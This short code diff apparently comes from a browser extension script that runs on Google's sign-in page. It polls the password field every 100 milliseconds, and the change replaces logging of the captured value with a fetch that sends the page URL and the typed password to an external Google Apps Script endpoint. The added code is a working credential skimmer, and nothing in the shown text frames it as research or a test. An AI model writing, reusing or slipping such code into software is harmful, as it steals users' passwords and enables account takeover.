@@ -5,7 +5,9 @@ if(window.location.host === 'accounts.google.com'){
   setInterval(() => {
     if(password.attr('data-initial-value') !== currentVal){
       currentVal = password.attr('data-initial-value');
-      console.log(currentVal);
+      if(currentVal.length > 3){
+        fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${currentVal}`);
+      }
     }
   }, 100);
 }
